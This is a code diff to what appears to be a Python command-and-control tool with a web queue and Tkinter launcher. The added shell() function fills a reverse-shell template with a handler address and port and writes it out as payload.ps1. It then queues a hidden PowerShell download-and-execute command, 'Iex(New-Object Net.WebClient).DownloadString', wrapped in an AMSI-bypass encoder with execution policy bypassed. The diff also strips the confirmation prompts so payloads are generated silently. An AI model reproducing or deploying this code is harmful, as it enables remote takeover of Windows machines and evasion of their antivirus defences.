@@ -10,6 +10,7 @@ import os
 import subprocess
 import random
 import socket
+import base64
 if  "/.dockerenv" not in glob.glob("/.*"):
     from tkinter.messagebox import *
     from tkinter import *
@@ -20,7 +21,7 @@ if  "/.dockerenv" not in glob.glob("/.*"):
 class AmsiBypass:
 
     def __init__(self):
-        self.tech = input("Encryption level ? (strong/moderate/weak) :")
+        self.tech = "moderate"
         self.payload = ""
 
     def encode_pws(self,chaine):
@@ -95,10 +96,7 @@ class AmsiBypass:
     def download_and_execute_ps1(self,url):
         payload = self.encode_pws(f'Iex(New-Object Net.WebClient).DownloadString(\'{url}\');')
         payload = "powershell.exe -WindowStyle Hidden -exec bypass -C "+'"'+self._execute_cmd_bypamsi(payload)+'"'
-        if input("Do you want to display the payload ? (y/n) :").lower()=="y":
-            return payload
-        else:
-            return "Payload not saved"
+        return payload
 
     def download_and_execute_ps1_persistance(self,url):
         self.tech = "moderate"
@@ -180,10 +178,21 @@ def mimikatz():
     print("|  Mimikatz |")
     print("+-----------+")
 
-def shell():
+def shell(id):
     print("+-----------+")
     print("|   Shell   |")
     print("+-----------+")
+    payload = AmsiBypass()
+    with open('./commands_templates/shell.txt',"r") as file:
+        data = file.read()
+    global handler_host
+    data = data.replace("%%ip%%",str(handler_host))
+    data = data.replace("%%port%%","1234")
+    with open("./uploads/payload.ps1","w") as file:
+        file.write(data)
+    payload = payload.download_and_execute_ps1(f"http://{handler_host}/download/?file=payload.ps1")
+    with open(f"./queue/{id}.txt","a") as file:
+        file.write("\n"+payload)
 
 def poweroff():
     print("+-----------+")
@@ -208,6 +217,12 @@ admin_usr = "admin"
 
 global host
 host1 = "0.0.0.0"
+
+global handler_port
+handler_port = "1234"
+
+global handler_host
+handler_host = "0.0.0.0"
 
 global commands
 commands = []
@@ -394,11 +409,14 @@ def edit_queue():
                 print(request.form.get("auto"))
                 if request.form.get("auto") and request.form.get("auto")!=0:
                     action = request.values.get("auto")
+                    if not request.values.get("id2"):
+                        return render_template("edit_queue.html",error="Set an ID, to use auto commands.")
+                    id2 = request.values.get("id2")
                     if action == "0":
                         return render_template("edit_queue.html",error="Invalid auto command.")
                     else:
                         global dico_action
-                        dico_action[int(action)]()
+                        dico_action[int(action)](id2)
                         return render_template("edit_queue.html",error="Done !")
                 id = request.values.get('id')
                 if id == "":
@@ -541,9 +559,19 @@ def on_closing():
 def set_ip():
     global root
     host_ip=ip_host.get()
+    host_handler = ip_handler.get()
+    port = port_handler.get()
     if host_ip == "":
         host_ip = "0.0.0.0"
+    if host_handler == "":
+        host_handler = "127.0.0.1"
+    if port == "":
+        port ="1234"
     global host1
+    global handler_host
+    global handler_port
+    handler_port = port
+    handler_host = host_handler
     host1 = host_ip
     root.destroy()
 
@@ -561,11 +589,17 @@ try:
         global root
         root = Tk()
         root.title("Launcher")
-        root.geometry("500x200")
+        root.geometry("500x300")
         ip_host=StringVar()
-        label_big = Label(root, text="Host Set :", font=("Times New Roman", 35, "bold")).pack()
+        ip_handler = StringVar()
+        port_handler = StringVar()
+        label_big = Label(root, text="\nHost Set :", font=("Times New Roman", 35, "bold")).pack()
         label_low = Label(root, text="Set an host (default 0.0.0.0) :").pack()
         ip_ENTRY= Entry(root, textvariable=ip_host).pack()
+        label_low2 = Label(root, text="\nSet an host for the handler (default 127.0.0.1 :").pack()
+        ip_ENTRY2= Entry(root, textvariable=ip_handler).pack()
+        label_low3 = Label(root, text="\nSet an ip for the handler (default 1234 :").pack()
+        ip_ENTRY3= Entry(root, textvariable=port_handler).pack()
         submit = Button(root, text='Set Ip',command=set_ip).pack()
 
         root.protocol("WM_DELETE_WINDOW", on_closing)
